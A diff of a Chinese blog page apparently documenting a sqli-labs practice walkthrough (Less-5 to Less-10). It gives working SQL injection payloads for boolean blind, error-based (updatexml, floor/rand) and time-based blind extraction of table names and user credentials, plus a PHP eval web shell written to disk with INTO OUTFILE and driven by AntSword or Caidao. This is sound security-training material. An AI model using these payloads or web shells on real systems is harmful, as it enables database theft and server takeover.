@@ -227,10 +227,14 @@
             <h1 style="display: none">sqli-labs（二）</h1>
             
             <div class="markdown-body">
-              <h1 id="Sqli-labs–2"><a href="#Sqli-labs–2" class="headerlink" title="Sqli-labs–2"></a>Sqli-labs–2</h1><ul>
-<li><a href="#sqli-labs--2">Sqli-labs–2</a><ul>
-<li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a><ul>
-<li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a><ul>
+              <h1>Sqli-labs–2</h1>
+<ul>
+<li><a href="#sqli-labs--2">Sqli-labs–2</a>
+<ul>
+<li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a>
+<ul>
+<li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a>
+<ul>
 <li><a href="#1%E8%AF%95%E6%8E%A2">1.试探:</a></li>
 <li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>猜数据库名长度</strong>:</a></li>
 <li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>猜库名：</strong></a></li>
@@ -241,8 +245,10 @@
 </li>
 </ul>
 </li>
-<li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a><ul>
-<li><a href="#less-6">Less-6</a><ul>
+<li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a>
+<ul>
+<li><a href="#less-6">Less-6</a>
+<ul>
 <li><a href="#1%E8%AF%95%E6%8E%A2-1">1.试探</a></li>
 <li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.爆库名</a></li>
 <li><a href="#3%E7%88%86%E8%A1%A8">3.爆表</a></li>
@@ -250,9 +256,11 @@
 <li><a href="#5%E7%88%86%E5%80%BC">5.爆值</a></li>
 </ul>
 </li>
-<li><a href="#less-7">Less-7</a><ul>
+<li><a href="#less-7">Less-7</a>
+<ul>
 <li><a href="#1%E8%AF%95%E6%8E%A2-2">1.试探</a></li>
-<li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a><ul>
+<li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a>
+<ul>
 <li><a href="#%E6%B3%95%E4%B8%80">法一：</a></li>
 <li><a href="#%E6%B3%95%E4%BA%8C">法二：</a></li>
 </ul>
@@ -262,13 +270,14 @@
 </ul>
 </li>
 <li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">法三：时间盲注</a></li>
-<li><a href="#less-8">Less-8</a><ul>
+<li><a href="#less-8">Less-8</a>
+<ul>
 <li><a href="#1%E8%AF%95%E6%8E%A2-3">1.试探</a></li>
 <li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.爆库长</a></li>
 <li><a href="#3%E7%88%86%E5%BA%93">3.爆库</a></li>
 <li><a href="#4%E7%88%86%E8%A1%A8-1">4.爆表</a></li>
 <li><a href="#5%E7%88%86%E5%88%97-1">5.爆列</a></li>
-<li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a><ul>
+<li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a></li>
 <li><a href="#less-9">Less-9</a></li>
 <li><a href="#less-10">Less-10</a></li>
 </ul>
@@ -276,36 +285,53 @@
 </ul>
 </li>
 </ul>
-</li>
-</ul>
-<h2 id="法一-联合注入"><a href="#法一-联合注入" class="headerlink" title="法一:联合注入"></a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a href="#盲注猜解Less-5" class="headerlink" title="盲注猜解Less-5"></a>盲注猜解Less-5</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探:"></a>1.试探:</h4><p>插入<code>?id=1&#39;</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p>
-<h4 id="2-猜数据库名长度"><a href="#2-猜数据库名长度" class="headerlink" title="2.猜数据库名长度:"></a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p>
+<h2 id="法一-联合注入"><a class="header-anchor" href="#法一-联合注入">🍭</a>法一:联合注入</h2>
+<h3 id="盲注猜解Less-5"><a class="header-anchor" href="#盲注猜解Less-5">🍭</a>盲注猜解Less-5</h3>
+<h4 id="1-试探"><a class="header-anchor" href="#1-试探">🍭</a>1.试探:</h4>
+<p>插入<code>?id=1'</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p>
+<h4 id="2-猜数据库名长度"><a class="header-anchor" href="#2-猜数据库名长度">🍭</a>2.<strong>猜数据库名长度</strong>:</h4>
+<p><code>’ and length (database())=8--+</code>试到8时回显正常</p>
 <p><img src="/2020/11/09/sqli-labs/1.jpg" srcset="/img/loading.gif" alt="1"></p>
-<h4 id="3-猜库名："><a href="#3-猜库名：" class="headerlink" title="3.猜库名："></a>3.<strong>猜库名：</strong></h4><p><code>&#39; and left((select database()),1)=&#39;s&#39;--+</code>回显正常，再探寻第二个字母<code>&#39; and left((select database()),2)=&#39;sy&#39;--+</code>报错：</p>
+<h4 id="3-猜库名："><a class="header-anchor" href="#3-猜库名：">🍭</a>3.<strong>猜库名：</strong></h4>
+<p><code>' and left((select database()),1)='s'--+</code>回显正常，再探寻第二个字母<code>' and left((select database()),2)='sy'--+</code>报错：</p>
 <p><img src="/2020/11/09/sqli-labs/3.jpg" srcset="/img/loading.gif" alt="3"></p>
-<p>将y换成e后正常，依次推出八位数（经漫长的试探…….）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p>
-<h4 id="4-爆表："><a href="#4-爆表：" class="headerlink" title="4.爆表："></a><strong>4.爆表：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
+<p>将y换成e后正常，依次推出八位数（经漫长的试探…）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p>
+<h4 id="4-爆表："><a class="header-anchor" href="#4-爆表：">🍭</a><strong>4.爆表：</strong></h4>
+<p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
 <p><img src="/2020/11/09/sqli-labs/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<h4 id="5-爆列："><a href="#5-爆列：" class="headerlink" title="5.爆列："></a><strong>5.爆列：</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" srcset="/img/loading.gif" alt="5"></p>
-<h4 id="6-爆值："><a href="#6-爆值：" class="headerlink" title="6.爆值："></a><strong>6.爆值：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" srcset="/img/loading.gif" alt="6"></p>
-<h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p>
-<h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p>
+<h4 id="5-爆列："><a class="header-anchor" href="#5-爆列：">🍭</a><strong>5.爆列：</strong></h4>
+<p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" srcset="/img/loading.gif" alt="5"></p>
+<h4 id="6-爆值："><a class="header-anchor" href="#6-爆值：">🍭</a><strong>6.爆值：</strong></h4>
+<p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" srcset="/img/loading.gif" alt="6"></p>
+<h2 id="法二：报错注入"><a class="header-anchor" href="#法二：报错注入">🍭</a>法二：报错注入</h2>
+<h3 id="Less-6"><a class="header-anchor" href="#Less-6">🍭</a>Less-6</h3>
+<h4 id="1-试探-v2"><a class="header-anchor" href="#1-试探-v2">🍭</a>1.试探</h4>
+<p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p>
+<h4 id="2-爆库名"><a class="header-anchor" href="#2-爆库名">🍭</a>2.爆库名</h4>
+<p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p>
 <p><img src="/2020/11/09/sqli-labs/10.jpg" srcset="/img/loading.gif" alt="10"></p>
-<h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p>
+<h4 id="3-爆表"><a class="header-anchor" href="#3-爆表">🍭</a>3.爆表</h4>
+<p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p>
 <p><img src="/2020/11/09/sqli-labs/11.jpg" srcset="/img/loading.gif" alt="11"></p>
-<h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1)%23</code></p>
+<h4 id="4-爆列"><a class="header-anchor" href="#4-爆列">🍭</a>4.爆列</h4>
+<p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23</code></p>
 <p><img src="/2020/11/09/sqli-labs/12.jpg" srcset="/img/loading.gif" alt="12"></p>
-<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p>
+<h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4>
+<p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p>
 <p><img src="/2020/11/09/sqli-labs/13.jpg" srcset="/img/loading.gif" alt="13"></p>
 <p><img src="/2020/11/09/sqli-labs/18.jpg" srcset="/img/loading.gif" alt="18"></p>
-<p>……还有很多，不一一列举。</p>
-<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探</h4><p>输入<code>id=1&#39;</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" srcset="/img/loading.gif" alt="8"></p>
-<h4 id="2-获取文件路径"><a href="#2-获取文件路径" class="headerlink" title="2.获取文件路径"></a>2.获取文件路径</h4><p>科普小知识：</p>
+<p>…还有很多，不一一列举。</p>
+<h3 id="Less-7"><a class="header-anchor" href="#Less-7">🍭</a>Less-7</h3>
+<h4 id="1-试探-v3"><a class="header-anchor" href="#1-试探-v3">🍭</a>1.试探</h4>
+<p>输入<code>id=1'</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<h4 id="2-获取文件路径"><a class="header-anchor" href="#2-获取文件路径">🍭</a>2.获取文件路径</h4>
+<p>科普小知识：</p>
 <p>@@datadir 读取数据库路径;@@basedir MYSQL 获取安装路径</p>
 <p>一句话木马:本关用到php版本的一句话木马：<code>&lt;?php @eval($_POST[“cmd”]);?&gt; </code></p>
 <p>load_file(): 读取本地文件; into outfile :写文件;</p>
 <p>用命令<code>union select 1,@@basedir,@@datadir --+</code>在低关卡查询文件的相对路径<img src="/2020/11/09/sqli-labs/9.jpg" srcset="/img/loading.gif" alt="9"></p>
-<h6 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h6><p>根据以上查询的文件地址使用<code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p>
+<h6 id="法一："><a class="header-anchor" href="#法一：">🍭</a>法一：</h6>
+<p>根据以上查询的文件地址使用<code>?id=1')) union select 1,2,'&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;' into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p>
 <p>蚁剑:</p>
 <p><img src="/2020/11/09/sqli-labs/26.jpg" srcset="/img/loading.gif" alt="26"></p>
 <p>注：密码为木马语句post框里的内容。</p>
@@ -313,33 +339,44 @@
 <p><img src="/2020/11/09/sqli-labs/27.jpg" srcset="/img/loading.gif" alt="27"></p>
 <p>也可以用菜刀：</p>
 <p><img src="/2020/11/09/sqli-labs/28.jpg" srcset="/img/loading.gif" alt="28"></p>
-<p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php……为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天……</p>
-<h6 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h6><p>使用<code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p>
+<p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php…为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天…</p>
+<h6 id="法二："><a class="header-anchor" href="#法二：">🍭</a>法二：</h6>
+<p>使用<code>?id=1')) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p>
 <p>可以在目录下发现text.php文件</p>
 <p><img src="/2020/11/09/sqli-labs/19.jpg" srcset="/img/loading.gif" alt="19"></p>
 <p>爆数据库名</p>
 <p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" srcset="/img/loading.gif" alt="21"></p>
 <p>爆表</p>
-<p><code>union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile</code></p>
+<p><code>union select 1,2,table_name from information_schema.tables where table_schema='security' into outfile</code></p>
 <p><img src="/2020/11/09/sqli-labs/22.jpg" srcset="/img/loading.gif" alt="22"></p>
 <p>爆字段</p>
-<p><code>union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" srcset="/img/loading.gif" alt="23"></p>
+<p><code>union select 1,2,column_name from information_schema.columns where table_schema='security' and table_name='users' into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" srcset="/img/loading.gif" alt="23"></p>
 <p>爆值</p>
 <p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" srcset="/img/loading.gif" alt="24"></p>
-<h2 id="法三：时间盲注"><a href="#法三：时间盲注" class="headerlink" title="法三：时间盲注"></a>法三：时间盲注</h2><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p><code>id=1&#39;</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来……）</p>
-<h4 id="2-爆库长"><a href="#2-爆库长" class="headerlink" title="2.爆库长"></a>2.爆库长</h4><p><code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" srcset="/img/loading.gif" alt="25"></p>
+<h2 id="法三：时间盲注"><a class="header-anchor" href="#法三：时间盲注">🍭</a>法三：时间盲注</h2>
+<h2 id="Less-8"><a class="header-anchor" href="#Less-8">🍭</a>Less-8</h2>
+<h4 id="1-试探-v4"><a class="header-anchor" href="#1-试探-v4">🍭</a>1.试探</h4>
+<p><code>id=1'</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来…）</p>
+<h4 id="2-爆库长"><a class="header-anchor" href="#2-爆库长">🍭</a>2.爆库长</h4>
+<p><code>?id=1' and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" srcset="/img/loading.gif" alt="25"></p>
 <p>图中圈圈在值为8的时候延迟了，故值为8</p>
-<h4 id="3-爆库"><a href="#3-爆库" class="headerlink" title="3.爆库"></a>3.爆库</h4><p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p>
-<p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=’security’。</p>
-<h4 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h4><p><code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; ,sleep(5),1)--+</code></p>
+<h4 id="3-爆库"><a class="header-anchor" href="#3-爆库">🍭</a>3.爆库</h4>
+<p><code>?id=1' and if(left(database(),1)='s',sleep(5),1)--+</code></p>
+<p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=‘security’。</p>
+<h4 id="4-爆表"><a class="header-anchor" href="#4-爆表">🍭</a>4.爆表</h4>
+<p><code>?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' ,sleep(5),1)--+</code></p>
 <p>得出表名为users。</p>
-<h4 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h4><p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 5,1),8)=&#39;password&#39; ,sleep(5),1) --+</code></p>
+<h4 id="5-爆列"><a class="header-anchor" href="#5-爆列">🍭</a>5.爆列</h4>
+<p><code>?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password' ,sleep(5),1) --+</code></p>
 <p>在limit5,1的时候查到了password，在limit4,1时查到了username.</p>
-<h4 id="6-爆值"><a href="#6-爆值" class="headerlink" title="6.爆值"></a>6.爆值</h4><p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p>
-<p><code>?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p>
+<h4 id="6-爆值"><a class="header-anchor" href="#6-爆值">🍭</a>6.爆值</h4>
+<p><code>?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p>
+<p><code>?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p>
 <p>所以第一个用户的名字dumb，密码dumb；在经过漫长的尝试依次查出其余的值。</p>
-<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>输入一系列符号，发现一直you are in ……;判断为时间盲注。输入<code>?id=1&#39; and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p>
-<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>
+<h3 id="Less-9"><a class="header-anchor" href="#Less-9">🍭</a>Less-9</h3>
+<p>输入一系列符号，发现一直you are in …;判断为时间盲注。输入<code>?id=1' and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p>
+<h3 id="Less-10"><a class="header-anchor" href="#Less-10">🍭</a>Less-10</h3>
+<p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>
 
             </div>
             <hr>
